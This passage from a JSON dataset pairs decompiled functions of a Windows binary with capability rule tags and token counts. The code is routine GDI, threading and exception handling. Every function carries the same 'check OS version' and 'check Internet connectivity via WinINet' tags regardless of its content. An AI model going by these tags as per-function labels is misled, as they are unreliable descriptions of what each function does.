        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00429c7c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((*(in_EAX + 0x32) == '\\0') || (*(in_EAX + 0x31) == '\\0')) {\n        iVar1 = *(in_EAX + 0x28);\n        if (*(iVar1 + 0xc) != 0) {\n            fcn.00428644();\n            sub.gdi32.dll_DeleteObject(*(iVar1 + 0xc));\n            *(iVar1 + 0xc) = 0;\n        }\n        fcn.00429bcc();\n        fcn.00429bdc();\n        iVar1 = *(in_EAX + 0x28);\n        fcn.00429b08();\n        uVar2 = fcn.00429150();\n        *(iVar1 + 0xc) = uVar2;\n        *(in_EAX + 0x32) = 1;\n        *(in_EAX + 0x31) = 1;\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "00429cdc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00429cdc(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    char cVar6;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (*(in_EAX + 0x30) != '\\0') {\n        return;\n    }\n    if (*(iVar1 + 0x10) != 0) {\n        return;\n    }\n    if (*(iVar1 + 0x14) == 0) {\n        return;\n    }\n    if (*(iVar1 + 0x14) == *(iVar1 + 8)) {\n        fcn.00428644();\n    }\n    iVar2 = fcn.00426190();\n    *(iVar1 + 0x10) = iVar2;\n    if (iVar2 != 0) {\n        return;\n    }\n    sub.user32.dll_GetDC(0);\n    uVar3 = fcn.00425a98();\n    if (*(iVar1 + 0x71) == '\\0') {\n        iVar2 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0xc);\n        iVar4 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0xe);\n        if (*(iVar1 + 0x2a) * *(iVar1 + 0x28) <= iVar2 * iVar4) {\n            cVar6 = '\\0';\n            goto code_r0x00429d6d;\n        }\n    }\n    cVar6 = '\\x01';\ncode_r0x00429d6d:\n    *(iVar1 + 0x71) = cVar6;\n    if (cVar6 != '\\0') {\n        uVar5 = sub.gdi32.dll_CreateHalftonePalette(uVar3);\n        *(iVar1 + 0x10) = uVar5;\n    }\n    sub.user32.dll_ReleaseDC(0, uVar3);\n    if (*(iVar1 + 0x10) == 0) {\n        *(in_EAX + 0x30) = 1;\n    }\n    return;\n}\n",
        "token_count": 472
    },
    "00429d94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429d94(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    int16_t in_DX;\n    uint var_54h;\n    int32_t var_40h;\n    uint var_3ch;\n    \n    if ((in_DX != 2) || (in_ECX == 0)) {\n        fcn.00425960();\n    }\n    fcn.00429bcc();\n    fcn.00403af4();\n    sub.gdi32.dll_GetObjectA();\n    if (var_40h == 0) {\n        var_3ch = 0;\n    }\n    fcn.004294fc(&var_54h);\n    *(in_EAX[10] + 0x70) = 0;\n    iVar1 = (**(*in_EAX + 0x24))();\n    *(in_EAX + 0x22) = iVar1 != 0;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 234
    },
    "00429e3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429e3c(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t iVar3;\n    uint in_EDX;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x429e58;\n    iVar1 = fcn.00404620();\n    puStack32 = 0x429ec4;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(iVar1 + 8) = in_EDX;\n    *(iVar1 + 0x10) = in_ECX;\n    puVar4 = iVar1 + 0x18;\n    for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = *arg_10h;\n        arg_10h = arg_10h + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *(iVar1 + 0x70) = arg_ch;\n    if (*(iVar1 + 0x2c) != 0) {\n        *(iVar1 + 0x14) = *(iVar1 + 8);\n    }\n    uStack40 = 0x429eb4;\n    puStack28 = &stack0xfffffffc;\n    uVar2 = fcn.00404800();\n    *(iVar1 + 0x6c) = uVar2;\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x497a18;\n    puStack32 = 0x429ee5;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack36 = 0x429f24;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.004288b8();\n    *(in_EAX + 0x28) = iVar1;\n    fcn.004288b4();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x429f2b;\n    uStack36 = 0x497a18;\n    uStack40 = 0x429f23;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 573
    },
    "0042a8b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042a8b0(uint param_1, uint8_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint var_5dh;\n    uint var_59h;\n    uint var_55h;\n    uint var_49h;\n    uint var_45h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_39h;\n    uint var_35h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    int32_t var_9h;\n    int32_t *var_4h;\n    \n    uStack116 = 0x42a8c6;\n    var_4h = in_EAX;\n    uVar2 = fcn.00429a1c();\n    if (param_2 != uVar2) {\n        if (param_2 == 0) {\n            uStack116 = 0x42a8e4;\n            (**(*var_4h + 0x70))();\n        }\n        else {\n            if (param_2 != 8) {\n                uStack116 = 0x42a907;\n                fcn.00403af4();\n                iVar1 = var_4h[10];\n                puVar5 = iVar1 + 0x18;\n                puVar6 = &fcn.0042a8b0::var_5dh;\n                for (iVar4 = 6; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar6 = *puVar5;\n                    puVar5 = puVar5 + 1;\n                    puVar6 = puVar6 + 1;\n                }\n                var_9h._0_1_ = '\\0';\n                var_49h = 0;\n                var_45h = 0x28;\n                var_41h = var_59h;\n                var_3dh = var_55h;\n                var_39h._0_2_ = 1;\n                var_39h._2_2_ = *(param_2 + 0x48fe4f);\n                unique0x00007a00 = *(iVar1 + 0x10);\n                if (param_2 == 2) {\n                    stack0xfffffff4 = *0x4979fc;\n                }\n                else if (param_2 == 3) {\n                    uStack116 = 0;\n                    uStack120 = 0x42a971;\n                    sub.user32.dll_GetDC();\n                    uStack120 = 0x42a976;\n                    uVar3 = fcn.00425a98();\n                    uStack124 = 0x42a97e;\n                    uStack120 = uVar3;\n                    *NULL = sub.gdi32.dll_CreateHalftonePalette();\n                    var_9h._0_1_ = '\\x01';\n                    uStack128 = 0;\n                    puStack132 = 0x42a98d;\n                    uStack124 = uVar3;\n                    sub.user32.dll_ReleaseDC();\n                }\n                else if (param_2 == 5) {\n                    var_35h = 3;\n                    var_1dh = 0xf800;\n                    var_19h = 0x7e0;\n                    var_15h = 0x1f;\n                }\n                uStack136 = 0x42a9fc;\n                iStack140 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffff74;\n                puVar5 = &fcn.0042a8b0::var_5dh;\n                puStack132 = &stack0xfffffffc;\n                (**(*var_4h + 0x68))();\n                fcn.004294fc(puVar5);\n                *(var_4h + 0x22) = stack0xfffffff4 != 0;\n                *in_FS_OFFSET = puVar5;\n                uStack136 = 0x42aa03;\n                if (var_9h != '\\0') {\n                    iStack140 = stack0xfffffff4;\n                    sub.gdi32.dll_DeleteObject();\n                }\n                return;\n            }\n            uStack116 = 0x42a8f3;\n            fcn.00425960();\n        }\n    }\n    return;\n}\n",
        "token_count": 1037
    },
    "0042aa3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042aa3c(char param_1, int32_t *param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iStackY1120;\n    uchar *puStackY1116;\n    char cVar5;\n    char cStack1080;\n    uchar auStack1054 [1038];\n    \n    fcn.00403af4();\n    puVar1 = *(*(in_EAX + 0x28) + 0x6c);\n    if (puVar1 == NULL) {\n        fcn.00429b58();\n        iVar2 = *(in_EAX + 0x28);\n        if (*(iVar2 + 0x14) != 0) {\n            cVar5 = *(iVar2 + 0x50);\n            fcn.004268ec(*(iVar2 + 0x50));\n            if (*(iVar2 + 0x70) != '\\0') {\n                cStack1080 = '\\f';\n                if (*(iVar2 + 0x3e) < 9) {\n                    cStack1080 = (1 << (*(iVar2 + 0x3e) & 0x1f)) * '\\x03' + '\\f';\n                }\n            }\n            fcn.00403af4(cVar5 + cStack1080 + '\\x0e');\n            fcn.00429930();\n            fcn.00425770();\n            sub.gdi32.dll_SelectObject(*(*(in_EAX + 0x2c) + 4), *(iVar2 + 0x14));\n            fcn.00425a98();\n            sub.gdi32.dll_GetDIBColorTable(*(*(in_EAX + 0x2c) + 4), 0, 0x100);\n            iStackY1120 = *(*(in_EAX + 0x2c) + 4);\n            sub.gdi32.dll_SelectObject();\n            puVar3 = *(iVar2 + 0x50);\n            puStackY1116 = auStack1054;\n            if ((puVar3 != NULL) && (puVar3 < auStack1054)) {\n                puStackY1116 = puVar3;\n            }\n            if ((((*(iVar2 + 0x70) == '\\0') && (puStackY1116 == NULL)) && (*(iVar2 + 0x10) != 0)) &&\n               ((*(iVar2 + 0x71) == '\\0' && (puStackY1116 = fcn.00426234(),  8 < *(iVar2 + 0x3e))))) {\n                iStackY1120 = iStackY1120 + puStackY1116 * 4;\n            }\n        }\n        if (param_1 != '\\0') {\n            fcn.0041b968();\n        }\n        if (iStackY1120 != 0) {\n            fcn.00428a3c();\n            if (puStackY1116 != NULL) {\n                if ((*(iVar2 + 0x50) == NULL) || (*(iVar2 + 0x50) != puStackY1116)) {\n                    *(iVar2 + 0x50) = puStackY1116;\n                }\n                if (*(iVar2 + 0x70) != '\\0') {\n                    fcn.00425f10();\n                }\n            }\n            if (*(iVar2 + 0x70) == '\\0') {\n                fcn.0041b968();\n                fcn.0041b968();\n                if ((8 < *(iVar2 + 0x3e)) && ((*(iVar2 + 0x40) & 3) != 0)) {\n                    fcn.0041b968();\n                }\n            }\n            else {\n                fcn.0041b968();\n                fcn.0041b968();\n            }\n            fcn.0041b968();\n            fcn.0041b968();\n        }\n    }\n    else {\n        uVar4 = (***puVar1)();\n        if (param_1 != '\\0') {\n            fcn.0041b968(uVar4);\n        }\n        (****(*(in_EAX + 0x28) + 0x6c))();\n        (**(*param_2 + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 960
    },
    "0042afc4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042afc4(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uStack32;\n    int16_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 8) == 0) && (*(iVar1 + 0xc) != 0)) {\n        iVar2 = 0;\n        fcn.0041b724(0, 0);\n        uStack32 = 0x42aff3;\n        fcn.0041b930();\n        if (iVar2 != 0) {\n            if (iVar2 == 1) {\n                uStack32 = 6;\n                fcn.004264e4(iVar1 + 0x10, in_EAX + 0x2c);\n            }\n            else {\n                uStack32 = 0x42b02f;\n                fcn.00425984();\n            }\n        }\n        *(iVar1 + 8) = uStack32;\n    }\n    return;\n}\n",
        "token_count": 229
    },
    "0042b03c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042b03c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ah;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (*(iVar1 + 0xc) == 0) {\n        if (*(iVar1 + 8) == 0) {\n            puStack32 = 0x42b05f;\n            fcn.00425984();\n        }\n        puStack32 = 0x42b06b;\n        uVar2 = fcn.00404620();\n        uStack36 = 0x42b0c9;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        iVar3 = fcn.0042af88();\n        if (iVar3 == *0x497a14) {\n            fcn.00403af4();\n            fcn.0041b968();\n        }\n        else {\n            fcn.0042af88();\n            fcn.00426a34();\n        }\n        *in_FS_OFFSET = uStack40;\n        *(iVar1 + 0xc) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 319
    },
    "0042b654": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042b654(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x42b66c;\n    fcn.0042b63c();\n    uStack32 = 0x42b6f5;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    for (var_8h = *(in_EAX + 4); (var_8h != NULL && ((param_2 != var_8h[2] || (param_1 != var_8h[3]))));\n        var_8h = *var_8h) {\n    }\n    if (var_8h == NULL) {\n        puStack28 = &stack0xfffffffc;\n        puVar1 = fcn.00402f00();\n        *puVar1 = *(in_EAX + 4);\n        uVar2 = fcn.0042b708();\n        puVar1[1] = uVar2;\n        puVar1[2] = param_2;\n        puVar1[3] = param_1;\n        *(in_EAX + 4) = puVar1;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x42b6fc;\n    uStack32 = 0x42b6f4;\n    fcn.0042b648();\n    return;\n}\n",
        "token_count": 377
    },
    "0042b888": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042b888(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x497a58 != 0) {\n        uVar1 = fcn.004241b0();\n        fcn.004241b0(uVar1);\n        iVar2 = fcn.0042b654();\n        return *(iVar2 + 4);\n    }\n    return 0;\n}\n",
        "token_count": 93
    },
    "0042bb78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042bb78(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        puStack56 = 0x42bb95;\n        in_EAX = fcn.00404974();\n    }\n    uStack60 = 0x42bc22;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    fcn.004055c8();\n    fcn.0040d2d8();\n    arg_8h_00 = 0;\n    fcn.00407550();\n    fcn.0040af9c(arg_8h_00);\n    fcn.0040dc78(arg_8h);\n    *(in_EAX + 0xc) = arg_ch;\n    *in_FS_OFFSET = arg_8h;\n    uStack64 = 0x42bc29;\n    fcn.00405530();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 304
    },
    "0042c8b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c8b4(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uchar auStack76 [4];\n    int32_t iStack72;\n    int32_t iStack64;\n    uint arg_8h_00;\n    uint arg_ch;\n    uint arg_10h;\n    uint arg_14h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x42c979;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    if (in_EAX == -0x7ffdfff7) {\n        arg_14h = *(in_EDX + 0x1c);\n        puStack32 = &stack0xfffffffc;\n        fcn.004057d4();\n        arg_10h = 0;\n        fcn.004057d4();\n        arg_ch = 0;\n        arg_8h_00 = *(in_EDX + 0x10);\n        fcn.004057d4();\n        iStack64 = fcn.0042bc4c(arg_8h_00, arg_ch, arg_10h, arg_14h);\n        if (arg_8h != '\\0') {\n            fcn.004061e4();\n        }\n    }\n    else {\n        arg_10h = 0;\n        iStack64 = fcn.0042bb78(0, in_EAX);\n    }\n    if (in_ECX != 0) {\n        iStack72 = iStack64;\n        if (iStack64 == 0) {\n            iStack72 = fcn.00405470();\n        }\n    // WARNING: Could not recover jumptable at 0x00404ee5. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x493014)(0xeedfade, 1, 7, auStack76);\n        return;\n    }\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_10h;\n    uStack40 = 0x42c980;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 539
    },
    "0042cbe0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042cbe0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x42cc56;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x497a5c = *0x497a5c + 1;\n    if (*0x497a5c == 0) {\n        *0x497a60 = 1;\n        fcn.00404650();\n        **0x492670 = 0;\n        **0x492308 = 0;\n        **0x492600 = 0;\n        if (*0x497a6c != '\\0') {\n            sub.ole32.dll_CoUninitialize();\n        }\n        fcn.004060f8();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 219
    },
    "0042def0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042dfcf)\n\nvoid __fastcall fcn.0042def0(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_19h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x42e00d;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        puStack56 = 0x42df2e;\n        fcn.00405584();\n        puVar1 = puStack44;\n    }\n    puStack44 = puVar1;\n    if (-1 < *(*(in_EAX + 0x10) + 8) + -1) {\n        puStack56 = 0x42df59;\n        fcn.00419888();\n        puStack56 = 0x42df64;\n        fcn.00407024();\n        uStack60 = 0x42dfdc;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        puStack56 = &stack0xfffffffc;\n        fcn.0040700c();\n        cVar2 = fcn.0040f944();\n        if (cVar2 != '\\0') {\n            (**(_pe_dos_header + 0x40))();\n            (**(_pe_dos_header + 0x44))();\n        }\n        iVar3 = (**(_pe_dos_header + 0x10))();\n        if (iVar3 < 1) {\n            *in_FS_OFFSET = uStack52;\n            return;\n        }\n        puStack56 = 0x42dfba;\n        fcn.00404f70();\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x42e014;\n    uStack48 = 0x42e004;\n    fcn.0040700c();\n    uStack48 = 0x42e00c;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 566
    },
    "0042d71c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042d71c(int32_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStackY112;\n    uint uStackY108;\n    uchar *puStackY104;\n    uint uStackY100;\n    uint in_stack_ffffffa0;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack72 = 0x42d9b3;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puVar1 = &stack0xfffffffc;\n    var_ch = param_2;\n    var_8h = in_EAX;\n    if (param_1 != 0) {\n        puStack80 = 0x42d754;\n        fcn.00405584();\n        puVar1 = puStack68;\n    }\n    puStack68 = puVar1;\n    if (0 < *(*(var_8h + 0x10) + 8)) {\n        puStack80 = 0x42d770;\n        var_20h = fcn.00404620();\n        uStack84 = 0x42d98e;\n        uStack88 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa8;\n        iVar2 = *(*(var_8h + 0x10) + 8);\n        puStack80 = &stack0xfffffffc;\n        if (-1 < iVar2 + -1) {\n            var_10h = 0;\n            puStack80 = &stack0xfffffffc;\n            var_24h = iVar2;\n            do {\n                iVar2 = fcn.00419888();\n                iVar2 = (**(**(iVar2 + 4) + 0x10))();\n                if (0 < iVar2) {\n                    fcn.00419730();\n                }\n                var_10h = var_10h + 1;\n                var_24h = var_24h + -1;\n            } while (var_24h != 0);\n        }\n        if (*(var_20h + 8) == 0) {\n            var_2ch = fcn.004059dc();\n            var_28h._0_1_ = 6;\n            in_stack_ffffffa0 = 0;\n            uStackY100 = 0x42d7fb;\n            fcn.0040dbe4(0, &fcn.0042d71c::var_2ch);\n            uStackY100 = 0x42d800;\n            fcn.00404ec4();\n        }\n        else {\n            if (*(var_20h + 8) != 1) {\n                var_18h = fcn.00404620();\n                uStackY100 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffff9c;\n                if (-1 < *(var_20h + 8) + -1) {\n                    var_10h = 0;\n                    var_24h = *(var_20h + 8);\n                    do {\n                        puStackY104 = 0x42d864;\n                        iVar2 = fcn.00419888();\n                        puStackY104 = 0x42d871;\n                        var_1ch = (**(**(iVar2 + 4) + 0x14))();\n                        if (var_1ch != NULL) {\n                            uStackY108 = 0x42d8d6;\n                            uStackY112 = *in_FS_OFFSET;\n                            *in_FS_OFFSET = &stack0xffffff90;\n                            puStackY104 = &stack0xfffffffc;\n                            iVar2 = (**(*var_1ch + 0x14))();\n                            if (-1 < iVar2 + -1) {\n                                var_14h = 0;\n                                do {\n                                    (**(*var_1ch + 0xc))();\n                                    (**(*var_18h + 0x3c))();\n                                    var_14h = var_14h + 1;\n                                    iVar2 = iVar2 + -1;\n                                } while (iVar2 != 0);\n                            }\n                            *in_FS_OFFSET = uStackY112;\n                            puStackY104 = 0x42d8dd;\n                            uStackY108 = 0x42d8d5;\n                            fcn.00404650();\n                            return;\n                        }\n                        var_10h = var_10h + 1;\n                        var_24h = var_24h + -1;\n                    } while (var_24h != 0);\n                }\n                if (*(var_8h + 0xc) == 0) {\n                    puStackY104 = 0x42d941;\n                    iVar2 = (**(*var_18h + 0x18))();\n                    puStackY104 = 0x42d950;\n                    (**(*var_18h + 0xc))();\n                    puStackY104 = 0x42d95b;\n                    (**(**(iVar2 + 4) + 0x20))();\n                }\n                else {\n                    puStackY104 = 0x42d8fd;\n                    (**(*var_18h + 0x90))();\n                    puStackY104 = 0x42d90b;\n                    iVar2 = (**(**(var_8h + 0xc) + 0xc))();\n                    if (-1 < iVar2) {\n                        puStackY104 = 0x42d91b;\n                        iVar2 = (**(*var_18h + 0x18))();\n                        puStackY104 = 0x42d92a;\n                        (**(*var_18h + 0xc))();\n                        puStackY104 = 0x42d935;\n                        (**(**(iVar2 + 4) + 0x20))();\n                    }\n                }\n                *in_FS_OFFSET = uStackY100;\n                fcn.00404650();\n                return;\n            }\n            iVar2 = fcn.00419888();\n            (**(**(iVar2 + 4) + 0x20))();\n        }\n        *in_FS_OFFSET = in_stack_ffffffa0;\n        uStack88 = 0x42d995;\n        fcn.00404650();\n        return;\n    }\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x42d9ba;\n    uStack72 = 0x42d9aa;\n    fcn.00405530();\n    uStack72 = 0x42d9b2;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1601
    },
    "0042da58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
